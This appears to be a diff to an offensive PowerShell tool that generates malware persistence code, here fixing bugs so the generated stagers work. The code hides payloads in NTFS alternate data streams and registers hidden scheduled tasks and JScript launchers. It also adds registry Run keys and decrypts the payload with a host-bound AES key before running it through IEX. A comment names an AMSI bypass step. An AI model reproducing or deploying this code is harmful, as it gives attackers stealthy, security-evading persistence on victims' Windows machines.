@@ -691,7 +691,7 @@ if(-not(Get-Item `$hp -Stream `$sn -EA 0)){
 
             $block += @"
 `$adsPath=`$hp+':'+`$sn
-`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_snEsc=(([string]`$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
 `$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
@@ -744,7 +744,7 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
 
             $block += @"
 `$adsPath=`$hp+':'+`$sn
-`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_snEsc=(([string]`$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
 `$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
@@ -771,9 +771,10 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
         $_ghk = $config.GHKFunctionName
         $_dec = $config.DecFunctionName
         if ($Encrypt) {
-            $regPayloadCmd = "function ${_ghk}" + '{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' + "function ${_dec}" + '($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' + "`$k=${_ghk};" + '$e=gc ' + "'" + '$hp' + ':' + '$sn' + "'" + " -Raw;IEX(${_dec} " + '$e $k)'
+            $regPayloadCmd = "function ${_ghk}" + '{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' + "function ${_dec}" + '($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' + "`$k=${_ghk};" + '$e=gc ' + "'" + '${hp}:${sn}' + "'" + " -Raw;IEX(${_dec} " + '$e $k)'
         } else {
-            $regPayloadCmd = 'IEX(gc ' + "'" + '$hp' + ':' + '$sn' + "'" + ' -Raw)'
+            # BUG-018 fix: use ${hp}:${sn} delimiters — plain $hp:$sn is parsed as PSDrive namespace
+            $regPayloadCmd = 'IEX(gc ' + "'" + '${hp}:${sn}' + "'" + ' -Raw)'
         }
 
         # AMSI bypass prefix
@@ -825,7 +826,7 @@ if(`$_isAdmin){Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentV
             $block += @"
 # Companion task: JScript wrapper for periodic + cheeky triggers
 `$adsPath=`$hp+':'+`$sn
-`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_snEsc=(([string]`$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
 `$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
@@ -858,7 +859,7 @@ shell.Run(cmd, 0, false);
             $block += @"
 # Companion task: JScript wrapper for periodic + cheeky triggers
 `$adsPath=`$hp+':'+`$sn
-`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_snEsc=(([string]`$sn).ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
 `$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
